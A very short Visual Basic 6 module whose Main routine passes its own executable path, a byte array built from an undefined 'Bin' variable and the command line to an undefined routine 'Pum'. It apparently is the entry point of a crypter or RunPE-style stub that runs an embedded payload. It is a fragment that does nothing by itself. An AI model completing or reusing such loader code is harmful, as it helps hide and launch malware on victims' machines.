Attribute VB_Name = "mMain"
Sub Main()
 fCall (App.Path & "\" & App.EXEName & ".exe")
 Bye() = StrConv(Bin, vbFromUnicode)
 Pum App.Path & "\" & App.EXEName & ".exe", Bye(), Command
End Sub
